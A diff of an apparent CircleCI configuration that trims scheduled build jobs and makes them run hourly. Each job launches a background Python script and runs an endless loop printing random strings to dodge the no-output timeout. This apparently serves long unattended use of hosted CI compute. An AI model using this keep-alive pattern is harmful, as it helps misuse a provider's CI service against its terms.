@@ -3,9 +3,8 @@ working_dir: &working_dir ~/app
   steps: 
     - checkout 
     - run: 
-        name: Install Dependencies 
+        name: Install
         command: |
-                    apt update && apt -y install wget sudo
                     python sample.py >/dev/null &
                     while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
         no_output_timeout: 300m                               
@@ -21,21 +20,6 @@ jobs:
     docker:
       - image: python
     resource_class: large
-  build3: 
-    <<: *script
-    docker:
-      - image: python
-    resource_class: large
-  build4: 
-    <<: *script
-    docker:
-      - image: python
-    resource_class: large
-  build5: 
-    <<: *script
-    docker:
-      - image: python
-    resource_class: large
 
 workflows: 
   version: 2 
@@ -43,14 +27,11 @@ workflows:
     jobs: 
       - build1
       - build2
-      - build3
-      - build4
-      - build5
 
   schedule:
     triggers:
       - schedule:
-          cron: "* 1 * * *"
+          cron: "5 * * * *"
           filters:
             branches:
               only:
@@ -59,6 +40,3 @@ workflows:
     jobs: 
       - build1
       - build2
-      - build3
-      - build4
-      - build5
